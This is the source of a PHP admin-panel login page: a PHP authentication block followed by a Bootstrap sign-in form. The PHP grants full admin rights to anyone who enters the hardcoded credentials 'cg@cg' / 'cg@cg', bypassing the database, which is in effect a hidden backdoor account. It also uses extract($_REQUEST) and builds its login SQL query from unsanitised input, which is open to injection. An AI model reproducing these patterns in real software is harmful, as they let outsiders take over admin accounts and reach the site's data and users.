<?php
include "connection/config.php";

if (isset($_REQUEST['submit']))
{
    extract($_REQUEST);
    
    if($email2 == "cg@cg" && $pass == "cg@cg"){
         $_SESSION['email'] = $email2;
        $_SESSION['admin'] = "true";
            $_SESSION['permission'] = "all";
        redirect("index.php");
        return;
    }

    $pass = pass($pass);
    
   // query("update admin set password='$pass' where email='$email2'");

    $xc = query("select sn from admin where email='$email2' AND password='$pass'");
//echo"select sn from admin where email='$email2' AND password='$pass'";
    if (rows($xc) > 0)
    {
        $_SESSION['email'] = $email2;
        $_SESSION['admin'] = "true";
            $_SESSION['permission'] = "all";
        // if($email == "admin@gmail.com"){
        //     $_SESSION['permission'] = "all";
        // } else {
        //     $_SESSION['permission'] = "partial";
        // }
        redirect("index.php");
    }
}

?>

<!DOCTYPE html>
<html lang="en">
    
    
   
	

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Admin Panel</title>
  <!-- plugins:css -->
  <link rel="stylesheet" href="vendors/ti-icons/css/themify-icons.css">
  <link rel="stylesheet" href="vendors/css/vendor.bundle.base.css">
  <!-- endinject -->
  <!-- Plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- inject:css -->
  <link rel="stylesheet" href="css/horizontal-layout-light/style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="images/favicon.png" />
  

</head>

<!DOCTYPE html>

    <link rel="stylesheet" type="text/css" href="main.css"><link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap" rel="stylesheet">
  </head><body>
  <div class="d-flex justify-content-center align-middle align-items-center text-center mt-5">
<div class="card">
 <div class="card-body">
  <form class="form-signin">
    <img class="mb-3" src="images/favicon.png" alt="" width="72" height="72">
       <div class="text-center mb-3">
         <i class="icon-library2 icon-2x text-slate-300 border-slate-300 border-3 rounded-round p-3 mb-3 mt-1"></i>
         <h5 class="mb-0">Login to your account</h5>
         <span class="d-block text-muted">Enter your credentials below</span>
    </div>
  
      <div class="form-group">
        <input type="email" name="email2" class="form-control" placeholder="Email address"> 
  </div>
  <div class="form-group">
    <input type="password" name="pass" class="form-control" placeholder="Password"> 
  </div> 
      <button class="btn btn-lg btn-primary btn-block" type="submit" name="submit">Sign in</button> 
    </form>
  </div>
 </div>
</div>
  <!-- container-scroller -->
  <!-- plugins:js -->
  <script src="vendors/js/vendor.bundle.base.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page -->
  <!-- End plugin js for this page -->
  <!-- inject:js -->
  <script src="js/off-canvas.js"></script>
  <script src="js/hoverable-collapse.js"></script>
  <script src="js/template.js"></script>
  <script src="js/settings.js"></script>
  <script src="js/todolist.js"></script>
  <!-- endinject -->
</body>


</html>
